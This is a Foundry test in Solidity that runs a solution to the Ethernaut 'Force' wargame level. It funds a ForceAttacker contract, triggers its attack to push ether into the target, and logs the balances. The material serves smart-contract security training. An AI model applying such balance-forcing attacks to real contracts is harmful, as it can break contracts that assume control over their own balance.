// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/7-Force/ForceFactory.sol";
import "../src/7-Force/ForceAttacker.sol";
import "../src/Ethernaut.sol";

contract ForceTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 5 ether);
    }

    function testForceHack() public {
        // Level setup
        ForceFactory forceFactory = new ForceFactory();
        ethernaut.registerLevel(forceFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(forceFactory);
        Force ethernautForce = Force(payable(levelAddress));

        // Level attack
        emit log_named_uint("Force balance pre attack", address(ethernautForce).balance);
        ForceAttacker attacker = new ForceAttacker(levelAddress);
        (bool success, ) = address(attacker).call{value: 1 ether}("");
        assertTrue(success);
        attacker.attack();
        emit log_named_uint("Force balance post attack", address(ethernautForce).balance);

        // Level submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress)); 
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}